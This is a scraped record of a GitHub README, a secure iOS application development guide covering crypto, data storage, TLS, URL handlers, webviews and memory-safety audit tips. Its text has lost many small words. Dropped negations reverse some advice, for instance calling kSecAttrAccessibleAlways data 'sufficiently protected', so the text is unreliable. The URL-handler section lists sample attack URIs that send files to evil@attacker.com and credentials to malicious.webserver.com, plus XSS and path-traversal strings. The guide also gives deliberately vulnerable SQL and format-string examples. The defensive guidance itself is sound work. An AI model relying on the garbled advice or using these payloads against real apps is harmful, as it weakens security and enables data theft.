{
	"_id": "14411136",
	"site": "https://github.com/felixgr/secure-ios-app-dev",
	"title": "The most common vulnerabilities found in iOS applications",
	"author": "walterbell",
	"date": "2017-06-13T13:56:41.703Z",
	"tags": {
		"categories": [
			"opensource",
			"security",
			"security-audit",
			"vulnerability-assessment",
			"ios"
		],
		"languages": []
	},
	"content": "readme.md secure ios application development guide is collection the common vulnerabilities found ios applications. focus is vulnerabilities the applications code only marginally covers general ios system security, darwin security, c/objc/c++ memory safety, high-level application security.nevertheless, hopefully guide serve training material ios app developers want make sure they ship more secure app. , ios security reviewers use as reference during assessments. like software, guide rot unless update . we encourage everyone help on , just open issue send pull request!api-level issuesapi: generate cryptographically-strong random numbersgenerally, ios provides easy--use cryptographic interfaces. dont implement custom crypto algorithms (besides crypto problems, can cause issues during app store review). supply cryptographically-strong random numbers cryptographic functions.audit tip: check all cryptographically secure random numbers arefetched using randomization services programming interface.correct example:int r = secrandomcopybytes(ksecrandomdefault, sizeof(int), (uint8_t*) &res);api: prevent leaking sensitive data during app backgrounding ios backgrounds app, screenshot the app might saved anunencrypted cache the local file system. happends example the userpresses home button. apple recommends developers hide sensitiveinformation before occurs. the app is handling sensitive user data, verify code exists hide blur sensitive elements the full window.audit tip: check hiding code applicationdidenterbackground.alternatively, can setallowscreenshot. using ignoresnapshotonnextapplicationlaunch seems broken.api: handle pasteboard securely the pasteboard is marked persistent may saved local storage along potentially sensitive user data. , make sure clear pasteboard an application backgrounds.audit tip: check uipasteboardnamegeneral & uipasteboardnamefind.api: disable auto-correction sensitive input fields ios versions cache keyboard entries auto-correction. is disabled password fields should disabled other sensitive fields (e.g.credit card number) well. set following prevent :uitextfield autocorrectiontype = uitextautocorrectiontypeno mark text field secure (hidden input) the securetextentry attribute.audit tip: check sensitive non-password input fields (e.g. creditcard) do have uitextautocorrectionno.data-handling issueshandling data: deserialize data securelyduring deserialization, objects are re-instantiated memory. thus, theserialized data originates an untrusted source, code execution might possible. writing own classes, is generally good idea comply the nssecurecoding protocol, make sure classes constructed external sources are intended class. is required apple classes are used inter-application communication (uiactivityviewcontroller).audit tip: check insecure deserialization untrusted sources. deserialization (nscoding, nscoder) must checks the deserializeddata be within bounds.audit tip: deserialization (cfbundle, nsbundle,nskeyedunarchiverdelegate, diddecodeobject, awakeafterusingcoder) directly lead code execution returning different objects duringdeserialization.audit tip: check nib files are dynamically loaded untrustedorigins.handling data: avoid sql injection attacker-supplied strings are concatenated a sql query, sql injection asqlite database may occur. might leak sensitive information thedatabase inject malicious payloads.audit tip: check calls sqlite3_exec() other non-prepared sqlfunctions. functions sqlite3_prepare*() should used instead.incorrect example:nsstring *uid = [myhttpconnection getuid];nsstring *statement = [nsstring stringwithformat:@\"select username userswhere uid = '%@'\",uid];const char *sql = [statement utf8string];correct example:const char *sql = \"select username users where uid = ?\";sqlite3_prepare_v2(db, sql, -1, &selectuid, null);sqlite3_bind_int(selectuid, 1, uid);int status = sqlite3_step(selectuid);app hardeninghardening: enable exploit mitigation compile- options order make exploiting ios applications harder the attacker, sure enable platform exploit mitigation options.audit tip: check compiler linker flags exploit mitigationare enabled.flags enable:objective-c automatic reference counting (-fobjc-arc) helps prevent-after-free use--release bugs. enabling arc might be alwayspossible shared code, performance-sensitive code, legacy codebases.check :otool - -v binary | grep _objc_autoreleasestack smashing protection (-fstack-protector-). this potentially helps prevent stack buffer overflows. check (should on default):otool - -v binary | grep stack_chk_guardfull aslr - position independent executable (-pie). makes harder the attacker find known code locations. (apple app store guards for iphone 5+ targets). check (should on default):otool -hv binary | grep piehardening: check xcodes static analysis reportstatic analysis help reveal memory leak, -after-free,-after-release, other bugs.audit tip: check output xcodes \"build & analyze\"network-level issuesnetworking: gtmsessionfetcher communication securely default,gtmsessionfetcherwont load non-https url schemes.audit tip: check no exceptions are made usingallowedinsecureschemes, allowlocalhostrequest gtm_allow_insecure_requests.networking: configure app transport security (ats) default, apps linked against ios 9 cannot unprotectedhttp connections. review the ats configuration is correct.audit tip: check no exceptions are done the info.plist.audit tip: check the list https domains the info.plist iscorrect. ios 10, new exceptions are available:exception streaming media using avfoundationnsallowsarbitraryloadsinwebcontent exempt ats wkwebviewnetworking: native tls/ssl securelyssl should used all communication prevent attackers reading modifying traffic the network.audit tip: check all apis besides local webviews ssl (httpsscheme, http).audit tip: check authorization tokens are never passed urls only headers https requests (e.g. a cookie header). concern hereis they are unintentionally logged a isp/company proxy accidentallyleaked through referrers without users knowledge.audit tip: check no debug options ssl been enabled therelease build:nsstream:kcfstreamssllevelkcfstreamsslallowsexpiredcertificateskcfstreamsslallowsanyrootkcfstreamsslallowsexpiredrootskcfstreamsslvalidatescertificatechainnsurlrequestsetallowsanyhttpscertificatensurlconnectioncontinuewithoutcredentialforauthenticationchallengevalidatessecurecertificatesetvalidatessecurecertificateissues ioio: validate incoming url handler callsuri handlers are special entry points the application can called email, chat, browser other applications. can used delivery vehicles attacks exploit logic bugs, xss, xsrf-style bugs buffer-overflows.audit tip: check uri handlers registered handled theapplication (registerforremotenotificationtypes handleopenurl). illustrate problem, attack ideas could feasible:myapp://cmd/run?program=/path//program//runmyapp://cmd/set_preference?use_ssl=falsemyapp://cmd/sendfile?=evil@attacker.com&file=/data/filemyapp://cmd/delete?data_to_delete=my_document_ive_been_working_onmyapp://cmd/login_to?server_to_send_credentials=malicious.webserver.commyapp://cmd/adduser='>\"><script>javascript run goes here</script>myapp://use_template?template=/../../../../../../../..//other/fileaudit tip: check userinfo launchoptions are validated duringparsing uri request. actions the url handler, is important ask user confirmation before taking action.additionally, note other applications be able register same url handler intercept requests. passing highly sensitive information is preferable sign /or encrypt url handler-transmitted data prevent leakage /or forgery.io: validate outgoing requests url handlersaudit tip: check outgoing requests made an uiwebview. acertain whitelist schemes should allowed (http/https) avoid file:,facetime:, facetime-audio:, sms:, other app-id: urls. sure filter tel: urls ( require user confirmation) they be used automatically dial cost incurring phone number. correct to check outgoing request is shown below:- (bool)webview:(uiwebview *)webview shouldstartloadwithrequest:(nsurlrequest *)request navigationtype:(uiwebviewnavigationtype)navigationtype; you are using wkwebview 'll need use -webview:decidepolicyfornavigationaction:decisionhandler: method thewknavigationdelegate protocol catch requests these.io: prevent webview ui redressingaudit tip: check webviews would allow browser ui redressing, example full screen webview could display ui similar theoriginal app to login screen. such webviews be used attackers do phishing.audit tip: check webviews would allow browsing web abrowser don't provide typical browser security ui an url barindicating domain tls status. , make sure if webview allowsbrowsing web, common browser security feature mixed-content preventionare still present the webview.io: avoid xss webviewsaudit tip: check the uiwebview/wkwebview is handling strings attackssimilar xss occur. xss a uiwebview potentially leak local files, example address book. make sure the webview is prone redirection can utilized phishing.memory corruption issuesmemory: prevent null byte injectioncf/ns strings contain null bytes different locations. an insecureconversion occurs string terminate early.audit tip: check incorrect conversion between raw bytes thecfdataref / cfstringref / nsstring c strings. example shows incorrect conversion:nsstring *fname = @\"user_supplied_image_name\\0\";nsstring *sourcepath = [[nsstring alloc] initwithformat:@\"%@/%@.jpg\", [[nsbundle mainbundle] resourcepath], fname];printf(\"%s\", [sourcepathutf8string]);// prints [...]products/debug/user_supplied_image_name without .jpg endingmemory: prevent format string attacksformat string attacks be mounted traditional functions (printf, scanf,syslog, etc.), also ios platform functions. xcode build & analyzeoption should catch missing format strings.audit tip: check missing format strings the following functions:cfstringcreatewithformatcfstringcreatewithformatandargumentscfstringappendformat[nsstring stringwithformat:] other nsstring methods takeformatted strings arguments:[nsstring initwithformat:][nsstring *withformat][nsstring stringbyappendingformat]appendingformatwrong example:[x stringbyappendingformat:[utilityclass formatstuff:attacker.text]];correct example:[x stringbyappendingformat:@\"%@\", [utilityclass formatstuff:attacker.text]];[nsmutablestring appendformat][nsalert alertwithmessagetext][nspredicate predicatewithformat:][nspredicate predicatewithformat:arguments:][nsexception raise:format:] [nsexception raise:format:arguments:]nsrunalertpanel other application kit functions create returnpanels sheets[nslog]security considerations apps built swiftkeep following mind you're developing ios apps swift:swift uses automatic reference counting (arc) default, is very helpful. string interpolation is used, is risk a format string attack. integer overflow causes runtime error.buffer overflows generally cannot occur due lack pointers, except unsafepointer is used c-compatibility., when handling sensitive memory, aware swift wont easily let erase sensitive data, e.g. passwords. way do is use unsafemutablepointer anunsafecollection ( secure memory swiftobjects more information).guide: where should store data ios?where i store data?keychainservicesencrypted key/value store designed hold:generic passwordsinternet passwords (password + protocol + server)certificatesprivate keysidentities (certificate + private key)max raw value size is ~16mb.keychains may shared ( is sso works ios) private theapp.keychains only shared apps the same vendor.enterprise/dogfood apps a different vendor id compared prod. application has access its own app-specific filesystem sandbox; pleaserefer apples file system programmingguide(specifically, ios sections) more details.documents/user-created data should visible the useroptionally visible the user itunessubdirectories generally arent, special tools still open backed user disable backup specific appsapp disable paths settingnsurlisexcludedfrombackupkeylibrary/caches/semi-persistent cached files visible the user backed may deleted the os any if app is runningmanaged automatically response storage pressurelibrary/application support/persistent files necessary run app visible the userbacked user disable backup specific appsapp disable paths settingnsurlisexcludedfrombackupkeylibrary/preferences/ /application support/ convention, files created nsuserdefaultslibrary/* /application support/tmp/non-persistent cached files visible the user backed periodically deleted the os the app is runningdoes os protect keychain? ?the keychain, modern ios devices (post-touch id) is secured using hardwaremodule. are known attacks directly compromise keychain via hardware software; jailbroken devices are vulnerable certain attacks.keychain backups ( icloud) cannot recovered without users icloudpassword. keychain data is included local backups unless backup isencrypted a password.does os protect files disk? ?yes, os provides four levels protection. note backups icloud arealways encrypted that backups itunes are optionally encrypted;unencrypted backups not up data marked any the protected classesbelow. devices filesystem is encrypted modern ios the dma path; options add extra layers security.nsfileprotectioncomplete - secure readable device is unlocked.file is closed the device is locked.suitable most apps data.nsfileprotectioncompleteunlessopenfile only opened the device is unlocked.file is closed the device is locked.file is encrypted the last open handle is closed.suitable data is uploaded the background, etc.nsfileprotectioncompleteuntilfirstuserauthentication (default)file is inaccessible until device is unlocked once boot.suitable background processes should start asap boot.geofence databluetooth accessories (e.g. android wear) general, user data should at least this level.nsfileprotectionnone - least secure protection.suitable certain applications must access data immediately boot without user interaction. encryption/decryption ishandled the os the keychain transparently. relevantdecryption key is created the keychain appropriate erased memory appropriate; thisguide more details.where should store data?sensitive persistent data - credentials, tokens, etc? keychain.large sensitive persistent files?save to library/* directory.exclude from backups.keychain backups a higher level security filesystembackups.set appropriate encryption options - secure possible.sensitive cache data?save to library/caches/*set appropriate encryption options - secure possible.application configuration?nsuserdefaults? library/preferences/[name].plist/custom format? library/application support/*set appropriate encryption options - secure possible.persistent content should backed ?user-generated user-visible?documents/* directory.dont subdirectories you users use itunes filesharing.nsfileprotectioncompleteuntilfirstuserauthentication is probably most appropriate option encryption, desired.note malware a trusted computer access directory itunes file sharing is enabled.shouldnt visible the user?library/application support/*set appropriate encryption options.best practices storagestore files securely stolen lost ios device be potentially jailbroken disassembled thecontents the local file system be read. therefore ios app developers need make sure encrypt sensitive information credentials other privateinformation.keychain already allows to prevent items ever leaving device beincluded backups. addition that:items be made require user consent accessed; consent be set touch id the device password fallback;items be made inaccessible passcode is removed. safest scenario require flagging items device-, requiring touchid access, invalidated passcode is ever removed.remember: can store piece text keychain, just username password credentials. apple uses to synchronize wifi credentialsbetween devices that you connect laptop a network, phone be able as a few seconds later synchronization finishes,saving from entering those long passwords your phone. moreinformation the details check the apple ios security whitepaper.audit tip: check stored data is usingksecattraccessiblewhenunlocked ksecattraccessibleafterfirstunlock. example, it is using ksecattraccessiblealways, the data is sufficiently protected.audit tip: check files created nsfileprotectionnone - have protection. note files created without explicit protection not necessarily nsfileprotectionnone. sure of following isused:nsfileprotectioncompletensfileprotectioncompleteunlessopen (key stays memory while locked file opened)nsfileprotectioncompleteuntilfirstuserauthentication (key stays memory locked)create secure temporary filesaudit tip: check secure temporary files directories are used - example, urlfordirectory, nstemporarydirectory,fsfindfolder(ktemporaryfoldertype). also create temporary filescorrectly the apple secure coding guide.avoid insecure destination files apisaudit tip: check private information (pii) nslog/alog, plist local sqlite databases. may be encrypted.audit tip: check only appropriate user-specific non-sensitiveinformation is written icloud storage. nsurlisexcludedfrombackupkey prevent backup files icloud itunes.audit tip: the keychain, check ksecattrsynchronizable is false the item is intended icloud keychain backup ( is false default).audit tip: check nsuserdefaultsdoes contain settings no personal information."
}